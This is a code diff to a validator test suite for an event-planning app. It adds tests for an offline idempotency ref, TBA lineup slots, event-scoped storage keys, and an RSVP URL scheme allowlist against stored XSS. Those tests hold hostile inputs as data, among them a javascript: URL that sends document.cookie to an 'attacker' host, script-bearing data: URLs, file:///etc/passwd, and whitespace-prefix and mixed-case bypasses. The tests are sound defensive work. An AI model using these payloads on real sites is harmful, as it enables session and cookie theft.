@@ -20,7 +20,6 @@ import {
   CreateDaySchema,
   PatchDaySchema,
   CreateArtistSchema,
-  PatchArtistSchema,
   LineupSlotSchema,
   BulkLineupSchema,
   CreatePoiSchema,
@@ -28,8 +27,11 @@ import {
   CreateZoneSchema,
   scopeTypeField,
   eventInstantField,
+  refField,
   CreatePersonalEventSchema,
   PatchPersonalEventSchema,
+  PublicPageConfigSchema,
+  isEventScopedObjectKey,
 } from './validators.js'
 
 describe('eventNameField', () => {
@@ -360,12 +362,6 @@ describe('CreateArtistSchema', () => {
   })
 })
 
-describe('PatchArtistSchema', () => {
-  it('requires at least one field', () => {
-    expect(PatchArtistSchema.safeParse({}).success).toBe(false)
-  })
-})
-
 describe('LineupSlotSchema', () => {
   it('accepts a minimal slot (artist + day)', () => {
     expect(LineupSlotSchema.safeParse({ artistId: 'art_1', dayId: 'evd_1' }).success).toBe(true)
@@ -393,8 +389,9 @@ describe('LineupSlotSchema', () => {
       }).success,
     ).toBe(true)
   })
-  it('rejects a missing dayId', () => {
-    expect(LineupSlotSchema.safeParse({ artistId: 'art_1' }).success).toBe(false)
+  it('accepts a missing or null dayId (unscheduled/TBA slot)', () => {
+    expect(LineupSlotSchema.safeParse({ artistId: 'art_1' }).success).toBe(true)
+    expect(LineupSlotSchema.safeParse({ artistId: 'art_1', dayId: null }).success).toBe(true)
   })
 })
 
@@ -521,6 +518,29 @@ describe('eventInstantField', () => {
   })
 })
 
+// --- Offline-create idempotency key --------------------------------
+describe('refField', () => {
+  it('accepts a 40-char tmp_<uuid> style ref', () => {
+    const ref = `tmp_${'a'.repeat(36)}`
+    expect(ref.length).toBe(40)
+    expect(refField.safeParse(ref).success).toBe(true)
+  })
+
+  it('rejects a ref over 256 characters', () => {
+    const ref = 'a'.repeat(257)
+    expect(refField.safeParse(ref).success).toBe(false)
+  })
+
+  it('accepts a ref at exactly 256 characters', () => {
+    const ref = 'a'.repeat(256)
+    expect(refField.safeParse(ref).success).toBe(true)
+  })
+
+  it('rejects an empty string', () => {
+    expect(refField.safeParse('').success).toBe(false)
+  })
+})
+
 // --- Slice 2: CreatePersonalEventSchema ----------------------------
 describe('CreatePersonalEventSchema', () => {
   it('accepts a minimal create (name only)', () => {
@@ -588,6 +608,33 @@ describe('CreatePersonalEventSchema', () => {
       expect(result.data).not.toHaveProperty('privacyMode')
     }
   })
+
+  it('accepts an offline-create ref for idempotent retries', () => {
+    const result = CreatePersonalEventSchema.safeParse({
+      name: 'Offline create',
+      ref: `tmp_${'b'.repeat(36)}`,
+    })
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.data.ref).toBe(`tmp_${'b'.repeat(36)}`)
+    }
+  })
+
+  it('rejects a ref over 256 characters', () => {
+    const result = CreatePersonalEventSchema.safeParse({
+      name: 'Offline create',
+      ref: 'a'.repeat(257),
+    })
+    expect(result.success).toBe(false)
+  })
+
+  it('omits ref when absent', () => {
+    const result = CreatePersonalEventSchema.safeParse({ name: 'No ref' })
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.data.ref).toBeUndefined()
+    }
+  })
 })
 
 describe('PatchPersonalEventSchema', () => {
@@ -625,5 +672,138 @@ describe('PatchPersonalEventSchema', () => {
 
   it('accepts a patch that only moves endAt (cross-check deferred to the route)', () => {
     expect(PatchPersonalEventSchema.safeParse({ endAt: '2026-06-03T09:00:00Z' }).success).toBe(true)
+  })
+})
+
+describe('PublicPageConfigSchema rsvp_link URL scheme guard (#2 stored XSS)', () => {
+  // Owner-supplied URL ends up rendered as <a href={url}> on PublicEventPage.
+  // Without the scheme allowlist, `javascript:` executes arbitrary JS in the
+  // events-web origin on click.
+  function configWithRsvpUrl(url: string) {
+    return { enabled: true, sections: [{ kind: 'rsvp_link', url }] }
+  }
+
+  it('accepts https RSVP destinations (the common case)', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('https://www.eventbrite.com/e/12345'),
+    )
+    expect(r.success).toBe(true)
+  })
+
+  it('accepts http (legacy event-org sites)', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('http://old-event-site.example.org/rsvp'),
+    )
+    expect(r.success).toBe(true)
+  })
+
+  it('accepts mailto: for direct-email RSVPs', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('mailto:rsvp@event.example.org?subject=RSVP'),
+    )
+    expect(r.success).toBe(true)
+  })
+
+  it('accepts tel: for direct-call RSVPs', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('tel:+15551234567'),
+    )
+    expect(r.success).toBe(true)
+  })
+
+  it('rejects javascript: scheme (closes the stored XSS)', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('javascript:fetch("//attacker", {method:"POST",body:document.cookie})'),
+    )
+    expect(r.success).toBe(false)
+  })
+
+  it('rejects data: URLs', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('data:text/html,<script>alert(1)</script>'),
+    )
+    expect(r.success).toBe(false)
+  })
+
+  it('rejects file: URLs', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('file:///etc/passwd'),
+    )
+    expect(r.success).toBe(false)
+  })
+
+  it('rejects vbscript: scheme (legacy IE; near-zero real use but trivially dangerous)', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('vbscript:msgbox("xss")'),
+    )
+    expect(r.success).toBe(false)
+  })
+
+  it('rejects ftp:// (not a navigation scheme)', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('ftp://files.example.com/rsvp.txt'),
+    )
+    expect(r.success).toBe(false)
+  })
+
+  it('rejects mixed-case JavaScript: (case folding)', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('JavaScript:alert(1)'),
+    )
+    expect(r.success).toBe(false)
+  })
+
+  it('rejects tab-prefixed javascript: (WHATWG whitespace-strip bypass)', () => {
+    // z.string().url() passes \tjavascript:... because the WHATWG parser
+    // strips leading C0 controls before scheme recognition. The
+    // .refine() catches it because new URL().protocol still resolves to
+    // 'javascript:'. This test documents that defence-in-depth works
+    // and guards against a future refactor that swaps the URL parse
+    // for a regex.
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('\tjavascript:alert(1)'),
+    )
+    expect(r.success).toBe(false)
+  })
+
+  it('rejects newline-prefixed javascript: (same whitespace-strip path)', () => {
+    const r = PublicPageConfigSchema.safeParse(
+      configWithRsvpUrl('\njavascript:alert(1)'),
+    )
+    expect(r.success).toBe(false)
+  })
+
+  it('preserves the existing 2048-char length cap', () => {
+    const longUrl = 'https://example.com/' + 'a'.repeat(2100)
+    const r = PublicPageConfigSchema.safeParse(configWithRsvpUrl(longUrl))
+    expect(r.success).toBe(false)
+  })
+})
+
+describe('isEventScopedObjectKey (audit 1.1 — theme keys stay in the event R2 namespace)', () => {
+  const eventId = 'evt_01ABCDEF'
+
+  it('accepts a key under events/<eventId>/', () => {
+    expect(isEventScopedObjectKey(`events/${eventId}/bg/01XYZ.jpg`, eventId)).toBe(true)
+    expect(isEventScopedObjectKey(`events/${eventId}/app-icon/01XYZ.png`, eventId)).toBe(true)
+  })
+
+  it('rejects a key scoped to another event', () => {
+    expect(isEventScopedObjectKey('events/evt_OTHER/bg.jpg', eventId)).toBe(false)
+  })
+
+  it('rejects keys in other namespaces (maps, arbitrary)', () => {
+    expect(isEventScopedObjectKey(`event-maps/${eventId}/m.png`, eventId)).toBe(false)
+    expect(isEventScopedObjectKey('secrets/backup.sql', eventId)).toBe(false)
+  })
+
+  it('rejects the bare prefix with no object name', () => {
+    expect(isEventScopedObjectKey(`events/${eventId}/`, eventId)).toBe(false)
+  })
+
+  it('rejects the empty string and prefix spoofs', () => {
+    expect(isEventScopedObjectKey('', eventId)).toBe(false)
+    expect(isEventScopedObjectKey(`events/${eventId}x/f.png`, eventId)).toBe(false)
+    expect(isEventScopedObjectKey(`events/${eventId}`, eventId)).toBe(false)
   })
 })
